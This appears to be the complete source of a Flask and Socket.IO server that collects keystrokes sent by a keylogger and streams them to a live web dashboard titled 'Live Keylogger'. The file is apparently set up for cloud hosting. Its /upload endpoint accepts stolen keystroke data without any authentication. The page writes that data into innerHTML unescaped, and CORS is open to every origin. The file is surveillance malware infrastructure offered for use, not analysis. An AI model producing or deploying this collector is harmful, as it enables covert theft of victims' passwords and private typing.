import os

from flask import Flask, render_template_string
from flask_socketio import SocketIO
from flask import request

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# HTML page with WebSocket connection
html_page = """
<!doctype html>
<html>
<head>
    <title>Live Keylogger</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
    </style>
</head>
<body>
    <h2>Live Keylogger Feed (No Refresh)</h2>
    <div id="log"></div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.min.js"></script>
  <script>
  var socket = io();
  socket.on('new_key', function(data) {
    const log = document.getElementById('log');
    log.innerHTML += data.key;
    if (log.innerHTML.length > 3000) {
      log.innerHTML = log.innerHTML.slice(-2000);  // only keep last 2000 chars
    }
  });
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_page)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.form.get('data')
    if data:
        socketio.emit('new_key', {'key': data})
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))  # Render sets PORT env var
    socketio.run(app, host='0.0.0.0', port=port)